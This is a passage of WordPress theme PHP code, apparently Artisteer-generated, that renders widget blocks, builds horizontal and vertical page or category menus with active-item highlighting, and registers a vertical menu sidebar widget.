	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	$bwc = '<!--- BEGIN WidgetContent --->';
	$ewc = '<!--- END WidgetContent --->';
	$ew = '<!--- END Widget --->';
	$content = art_normalize_widget_style_tokens($content, $bw, $bwt, $ewt, $bwc, $bwc, $ewc, $ew);
	$replaces = array(
		$bw => "<div class=\"art-block\">\r\n    <div class=\"art-block-tl\"></div>\r\n    <div class=\"art-block-tr\"></div>\r\n    <div class=\"art-block-bl\"></div>\r\n    <div class=\"art-block-br\"></div>\r\n    <div class=\"art-block-tc\"></div>\r\n    <div class=\"art-block-bc\"></div>\r\n    <div class=\"art-block-cl\"></div>\r\n    <div class=\"art-block-cr\"></div>\r\n    <div class=\"art-block-cc\"></div>\r\n    <div class=\"art-block-body\">\r\n",
		$bwt => "<div class=\"art-blockheader\">\r\n    <div class=\"l\"></div>\r\n    <div class=\"r\"></div>\r\n     <div class=\"t\">",
		$ewt => "</div>\r\n</div>\r\n",
		$bwc => "<div class=\"art-blockcontent\">\r\n    <div class=\"art-blockcontent-tl\"></div>\r\n    <div class=\"art-blockcontent-tr\"></div>\r\n    <div class=\"art-blockcontent-bl\"></div>\r\n    <div class=\"art-blockcontent-br\"></div>\r\n    <div class=\"art-blockcontent-tc\"></div>\r\n    <div class=\"art-blockcontent-bc\"></div>\r\n    <div class=\"art-blockcontent-cl\"></div>\r\n    <div class=\"art-blockcontent-cr\"></div>\r\n    <div class=\"art-blockcontent-cc\"></div>\r\n    <div class=\"art-blockcontent-body\">\r\n<!-- block-content -->\r\n",
		$ewc => "\r\n<!-- /block-content -->\r\n\r\n		<div class=\"cleared\"></div>\r\n    </div>\r\n</div>\r\n",
		$ew => "\r\n		<div class=\"cleared\"></div>\r\n    </div>\r\n</div>\r\n"
	);
	if ('' == $replaces[$bwt] && '' == $replaces[$ewt]) {
		$startTitle = 0;
		$endTitle = 0;
		$result = '';
		while (true) {
			$startTitle = strpos($content, $bwt, $endTitle);
			if (false == $startTitle) {
				$result .= substr($content, $endTitle);
				break;
			}
			$result .= substr($content, $endTitle, $startTitle - $endTitle);
			$endTitle = strpos($content, $ewt, $startTitle);
			if (false == $endTitle) {
				$result .= substr($content, $startTitle);
				break;
			}
			$endTitle += strlen($ewt);
		}
		$content = $result;
	}
	$content = str_replace(array_keys($replaces), array_values($replaces), $content);
	echo $content;
	return true;
}

/* horizontal menu */
function art_menu_items()
{
	global $artThemeSettings;
	
	if ('Pages' === $artThemeSettings['menu.source']) 
	{
		art_print_homepage();
		
		add_action('get_pages', 'art_menu_get_pages_filter');
		add_action('wp_list_pages', 'art_menu_list_pages_filter');
		
		wp_list_pages('title_li=&sort_column=menu_order');
		
		remove_action('wp_list_pages', 'art_menu_list_pages_filter');
		remove_action('get_pages', 'art_menu_get_pages_filter');
	}
	else 
	{
		add_action('get_terms', 'art_menu_get_terms_filter');
		add_action('wp_list_categories', 'art_menu_wp_list_categories_filter');
		
		wp_list_categories('title_li=');
		
		remove_action('wp_list_categories', 'art_menu_wp_list_categories_filter');
		remove_action('get_terms', 'art_menu_get_terms_filter');
	}
}
/* end horizontal menu */

/* horizontal menu filters */
function art_menu_get_pages_filter($pages)
{
	global $artThemeSettings;
	art_move_frontpage($pages);
	$artThemeSettings['menu.blogID'] = art_blogID($pages);
	$artThemeSettings['menu.activeID'] = art_active_pageID($pages);
	if (!$artThemeSettings['menu.showSubmenus'])
	{
		art_remove_subpage($pages);
	}
	$artThemeSettings['menu.topIDs'] = art_top_pageIDs($pages);
	return $pages;
}

function art_menu_list_pages_filter($output)
{
	global $artThemeSettings;
	
	$pref ='page-item-';
	
	if($artThemeSettings['menu.topIDs'])
	{
		foreach($artThemeSettings['menu.topIDs'] as $id)
		{
			$output = preg_replace('~<li class="([^"]*)\b(' 
				. $pref 
				. $id 
				. ')\b([^"]*)"><a ([^>]+)>([^<]*)</a>~',
				'<li class="$1$2$3"><a $4>' 
				. $artThemeSettings['menu.topItemBegin']
				. '$5' 
				. $artThemeSettings['menu.topItemEnd'] 
				. '</a>', $output, 1);
		}
	}
	$frontID = null;
	$blogID = null;
	
	if('page' == get_option('show_on_front')) 
	{
		$frontID = get_option('page_on_front');
		$blogID = $artThemeSettings['menu.blogID'];
	}
	
	if ($frontID) 
	{
		$output = preg_replace('~<li class="([^"]*)\b(' 
			. $pref . $frontID 
			. ')\b([^"]*)"><a href="([^"]*)" ~',
			'<li class="$1$2$3"><a href="'
			. get_option('home') 
			.'" ', $output, 1); 
	}
	
	$activeID = $artThemeSettings['menu.activeID'];
	
	if (is_home() && $blogID) 
	{
		$activeID = $blogID;	
	}
	
	if ($activeID)
	{
		$output = preg_replace('~<li class="([^"]*)\b('
			.$pref .$activeID. ')\b([^"]*)"><a ~',
			'<li class="$1$2$3"><a class="active" ', $output, 1);
	}
	
	return $output;
}

function art_menu_get_terms_filter($terms)
{
	global $artThemeSettings;
	
	$artThemeSettings['menu.activeID'] = art_active_catID($terms);
	
	if (!$artThemeSettings['menu.showSubmenus'])
	{
		art_remove_subcat($terms);
	}
			
	$artThemeSettings['menu.topIDs'] = art_top_catIDs($terms);

	return $terms;
}

function art_menu_wp_list_categories_filter($output)
{
	global $artThemeSettings;
	$pref ='cat-item-';
	if($artThemeSettings['menu.topIDs']) 
	{
		foreach($artThemeSettings['menu.topIDs'] as $id)
		{
			
			$output = preg_replace('~<li class="([^"]*)\b(' 
				. $pref . $id 
				. ')\b([^"]*)"><a ([^>]+)>([^<]*)</a>~',
				'<li class="$1$2$3"><a $4>' 
				. $artThemeSettings['menu.topItemBegin']
				. '$5' 
				. $artThemeSettings['menu.topItemEnd'] 
				. '</a>', $output, 1);
			
		}
	}
	if($artThemeSettings['menu.activeID'])
	{
		$output = preg_replace('~<li class="([^"]*)\b('
			. $pref . $artThemeSettings['menu.activeID']
			.')\b([^"]*)"><a ~',
			'<li class="$1$2$3"><a class="active" ',
			 $output, 1);
	}
	return $output;
}
/* end horizontal menu filters*/

/* vertical menu */
function art_vmenu_items()
{
	global $artThemeSettings;
	
	if ('Pages' === $artThemeSettings['vmenu.source']) 
	{
		art_print_homepage();
		
		add_action('get_pages', 'art_vmenu_get_pages_filter');
		add_action('wp_list_pages', 'art_vmenu_list_pages_filter');
		
		wp_list_pages('title_li=&sort_column=menu_order');
		
		remove_action('wp_list_pages', 'art_vmenu_list_pages_filter');
		remove_action('get_pages', 'art_vmenu_get_pages_filter');
	}
	else 
	{
		add_action('get_terms', 'art_vmenu_get_terms_filter');
		add_action('wp_list_categories', 'art_vmenu_wp_list_categories_filter');
		
		wp_list_categories('title_li=');
		
		remove_action('wp_list_categories', 'art_vmenu_wp_list_categories_filter');
		remove_action('get_terms', 'art_vmenu_get_terms_filter');
	}
}
/* end vertical menu */

/* vertical menu filters */
function art_vmenu_get_pages_filter($pages)
{
	global $artThemeSettings;
	art_move_frontpage($pages);
	$artThemeSettings['vmenu.blogID'] = art_blogID($pages);
	$artThemeSettings['vmenu.activeIDs'] = art_active_pageIDs($pages);
	if (!$artThemeSettings['vmenu.showSubmenus'])
	{
		art_remove_subpage($pages);
	}
	$artThemeSettings['vmenu.topIDs'] = art_top_pageIDs($pages);
	if (!$artThemeSettings['vmenu.simple'])
	{ 
		art_process_simple_pages($pages, $artThemeSettings['vmenu.activeIDs'], $artThemeSettings['vmenu.topIDs']);
	}
	
	return $pages;
}

function art_vmenu_list_pages_filter($output)
{
	global $artThemeSettings;
	
	$pref ='page-item-';
	
	if($artThemeSettings['vmenu.topIDs'])
	{
		foreach($artThemeSettings['vmenu.topIDs'] as $id)
		{
			$output = preg_replace('~<li class="([^"]*)\b(' 
				. $pref 
				. $id 
				. ')\b([^"]*)"><a ([^>]+)>([^<]*)</a>~',
				'<li class="$1$2$3"><a $4>' 
				. $artThemeSettings['menu.topItemBegin']
				. '$5' 
				. $artThemeSettings['menu.topItemEnd'] 
				. '</a>', $output, 1);
		}
	}
	$frontID = null;
	$blogID = null;
	
	if('page' == get_option('show_on_front')) 
	{
		$frontID = get_option('page_on_front');
		$blogID = $artThemeSettings['vmenu.blogID'];
	}
	
	if ($frontID) 
	{
		$output = preg_replace('~<li class="([^"]*)\b(' 
			. $pref . $frontID 
			. ')\b([^"]*)"><a href="([^"]*)" ~',
			'<li class="$1$2$3"><a href="'
			. get_option('home') 
			.'" ', $output, 1); 
	}
	
	$activeIDs = array();
	
	if (is_home() && $blogID) 
	{
		$activeIDs[] = $blogID;	
	} else {
		$activeIDs = $artThemeSettings['vmenu.activeIDs'];
	}
	
	if ($activeIDs)
	{
		foreach($activeIDs as $id)
		{
			$output = preg_replace('~<li class="([^"]*)\b('
				.$pref .$id. ')\b([^"]*)"><a ~',
				'<li class="$1$2$3"><a class="active" ', $output, 1);
		}
	}
	
	return $output;
}

function art_vmenu_get_terms_filter($terms)
{
	global $artThemeSettings;
	
	$artThemeSettings['vmenu.activeIDs'] = art_active_catIDs($terms);
	$artThemeSettings['vmenu.topIDs'] = art_top_catIDs($terms);
	if (!$artThemeSettings['vmenu.showSubmenus'])
	{
		art_remove_subcat($terms, $artThemeSettings['vmenu.topIDs']);
	}
	if (!$artThemeSettings['vmenu.simple'])
	{ 
		art_process_simple_cats($terms, $artThemeSettings['vmenu.activeIDs'], $artThemeSettings['vmenu.topIDs']);
	}
	return $terms;
}

function art_vmenu_wp_list_categories_filter($output)
{
	global $artThemeSettings;
	$pref ='cat-item-';
	if($artThemeSettings['vmenu.topIDs']) 
	{
		foreach($artThemeSettings['vmenu.topIDs'] as $id)
		{
			
			$output = preg_replace('~<li class="([^"]*)\b(' 
				. $pref . $id 
				. ')\b([^"]*)"><a ([^>]+)>([^<]*)</a>~',
				'<li class="$1$2$3"><a $4>' 
				. $artThemeSettings['menu.topItemBegin']
				. '$5' 
				. $artThemeSettings['menu.topItemEnd'] 
				. '</a>', $output, 1);
			
		}
	}
	if($artThemeSettings['vmenu.activeIDs'])
	{
		foreach($artThemeSettings['vmenu.activeIDs'] as $id)
		{
			$output = preg_replace('~<li class="([^"]*)\b('
				. $pref . $id
				.')\b([^"]*)"><a ~',
				'<li class="$1$2$3"><a class="active" ',
				$output, 1);
		}
	}

	return $output;
}
/* end vertical menu filters */

/* pages */
function art_print_homepage()
{
	global $artThemeSettings;
	if (true === $artThemeSettings['menu.showHome'] 
		&& ('page' != get_option('show_on_front') || 
			(!get_option('page_on_front') && !get_option('page_for_posts'))))
	{
		echo '<li><a' 
		. (is_home() ? ' class="active"' : '') 
		. ' href="' 
		. get_option('home') 
		. '">'
		.$artThemeSettings['menu.topItemBegin']
		. $artThemeSettings['menu.homeCaption'] 
		. $artThemeSettings['menu.topItemEnd'] 
		. '</a></li>';
	}
}

function art_move_frontpage(&$pages)
{
	if ('page' != get_option('show_on_front')) return;
	$frontID = get_option('page_on_front');
	if (!$frontID) return;
	foreach ($pages as $index => $page)
		if($page->ID == $frontID) {
			unset($pages[$index]);
			$page->post_parent = '0';
			$page->menu_order = '0';
			array_unshift($pages, $page);
			break;
		}
}

function art_remove_subpage(&$pages)
{
	foreach ($pages as $index => $page)
		if ($page->post_parent) unset($pages[$index]);
}

function art_top_pageIDs($pages)
{
	$page_IDs = array();
	foreach ($pages as $index => $page)
	{
		$page_IDs[] = $page->ID;
	}
	$result = array();
	foreach ($pages as $index => $page)
	{
		if (!$page->post_parent || !in_array($page->post_parent,$page_IDs))
		{
			$result[]=$page->ID;
		}
	}
	return $result;
}

function art_blogID($pages)
{
	$result = null;
	
	if(!'page' == get_option('show_on_front')) 
	{
		return $result;
	}
	
	$blogID = get_option('page_for_posts');
	
	if (!$blogID) 
	{
		return $result;
	}
	
	foreach ($pages as $page)
	{
		if ($page->ID == $blogID) 
		{ 
			$result = $page;
			break;
		}
	}
	
	while($result && $result->post_parent) 
	{
		foreach ($pages as $page)
		{
			if ($page->ID == $result->post_parent) 
			{
				$result = $page;
				break;
			}
		}
	}
	return ($result ? $result->ID : null);
}

function art_active_pageID($pages)
{
	$current_page = null;
	
	foreach ($pages as $index => $page)
	{
		if (is_page($page->ID)) 
		{ 
			$current_page = $page;
			break;
		}
	}

	while($current_page && $current_page->post_parent) 
	{
		$parent_page = get_page($current_page->post_parent);
		if ($parent_page && $parent_page->post_status == 'private') 
		{
			break;
		}
		$current_page = $parent_page;
	}
	
	return ($current_page ? $current_page->ID : null);
}

function art_active_pageIDs($pages)
{
	$current_page = null;
	foreach ($pages as $index => $page)
	{
		if (is_page($page->ID)) 
		{ 
			$current_page = $page;
			break;
		}
	}

	$result = array();
	if (!$current_page)
	{
		return $result;
	}
	
	$result[] = $current_page->ID;

	while($current_page->post_parent) 
	{
		$current_page = get_page($current_page->post_parent);
		$result[] = $current_page->ID;
	}
	return $result;
}

function art_process_simple_pages(&$pages, $activeIDs, $topIds)
{
	foreach ($pages as $index => $page)
	{
		if ($page->post_parent && !in_array($page->post_parent,$activeIDs) 
			&& !in_array($page->ID,$topIds))
		{
			unset($pages[$index]);
		}
	}
}
/* end pages */

/* categories */
function art_active_catID($categories)
{
	global $wp_query;
	
	$result = null;
	
	if (!$wp_query->is_category)
	{
		return $result;
	}
	
	$cat_obj = $wp_query->get_queried_object();
	
	if (!$cat_obj) 
	{
		return $result;
	}
	
	$result = $cat_obj->term_id;
	while ($cat_obj->parent != '0')
	{
		foreach ($categories as $index => $cat)
			if ($cat_obj->parent == $cat->term_id) {
				$cat_obj = $cat;
				break;
			}
		$result = $cat_obj->term_id;
	} 
	return $result;
}

function art_active_catIDs($categories)
{
	global $wp_query;
	
	$result = array();
	
	if (!$wp_query->is_category)
	{
		return $result;
	}
	
	$cat_obj = $wp_query->get_queried_object();
	
	if (!$cat_obj) 
	{
		return $result;
	}
	
	$result[] = $cat_obj->term_id;
	while ($cat_obj->parent != '0')
	{
		foreach ($categories as $index => $cat)
			if ($cat_obj->parent == $cat->term_id) {
				$cat_obj = $cat;
				break;
			}
		$result[] = $cat_obj->term_id;
	} 
	return $result;
}

function art_remove_subcat(&$terms, $topIds)
{
	foreach ($terms as $index => $cat)
	{
		if (!in_array($cat->term_id,$topIds)) 
		{
			unset($terms[$index]);
		}
	}
}

function art_top_catIDs($categories)
{
	$result = array();
	$catIds = array();
	foreach ($categories as $index => $cat)
	{
		$catIds[] = $cat->term_id;
	}
	foreach ($categories as $index => $cat)
	{
		if (!in_array($cat->parent,$catIds )) 
		{
			$result[] = $cat->term_id;
		}
	}
	return $result;
}

function art_process_simple_cats(&$terms, $activeIDs, $topIds)
{
	foreach ($terms as $index => $cat)
	{
		if (!in_array($cat->term_id,$topIds) && !in_array($cat->parent,$activeIDs))
		{
			unset($terms[$index]);
		}
	}
}
/* end categories */

add_filter('comments_template', 'legacy_comments');  
function legacy_comments($file) {  
    if(!function_exists('wp_list_comments')) : // WP 2.7-only check  
    $file = TEMPLATEPATH.'/legacy.comments.php';  
    endif;  
    return $file;  
}  

function widget_verticalmenu($args) {
	extract($args);
	global $artThemeSettings;
	$bw = "<div class=\"art-vmenublock\">\r\n    <div class=\"art-vmenublock-body\">\r\n";
	$bwt = "";
	$ewt = "";
	$bwc = "<div class=\"art-vmenublockcontent\">\r\n    <div class=\"art-vmenublockcontent-body\">\r\n<!-- block-content -->\r\n";
	$ewc = "\r\n<!-- /block-content -->\r\n\r\n		<div class=\"cleared\"></div>\r\n    </div>\r\n</div>\r\n";
	$ew = "\r\n		<div class=\"cleared\"></div>\r\n    </div>\r\n</div>\r\n";
	echo $bw;
	if ('' != $bwt && '' != $ewt) {
		echo $bwt;
		_e($artThemeSettings['vmenu.source'], 'kubrick');
		echo $ewt;
	}
	echo $bwc;
?>
<ul class="art-vmenu">
<?php art_vmenu_items(); ?>
</ul>
<?php
	echo $ewc;
	echo $ew;
}

function widget_verticalmenu_init() {
	if ( !function_exists('register_sidebar_widget') ) return;
	register_sidebar_widget(array('Vertical menu', 'widgets'), 'widget_verticalmenu');
}

add_action('widgets_init', 'widget_verticalmenu_init');?>
